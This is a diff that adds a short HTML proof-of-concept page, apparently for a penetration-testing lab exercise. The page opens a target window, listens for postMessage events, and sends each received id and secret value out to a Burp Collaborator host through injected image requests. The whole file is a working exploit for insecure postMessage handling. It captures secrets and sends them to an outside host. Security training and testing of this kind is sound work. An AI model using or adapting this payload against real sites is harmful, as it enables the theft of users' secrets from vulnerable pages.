@@ -1,0 +1,22 @@
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    function listener(event) {
+        var ul= document.getElementById("secrets");
+        var li = document.createElement("img");
+        li.src = "https://5z5qkbrxwxavhyqw16yzqy117sdi17.burpcollaborator.net?id="+event.data.id+"&value="+event.data.value
+        ul.appendChild(li);
+    }
+    if (window.addEventListener){
+        addEventListener("message", listener, false);
+    } else {
+        attachEvent("onmessage", listener);
+    }
+    window.open('http://ptl-09c65373-32c313d9.libcurl.so/key/0')
+    </script>
+</head>
+<body>
+    <ul id="secrets"></ul>
+    <div id="message"></div>
+</body>
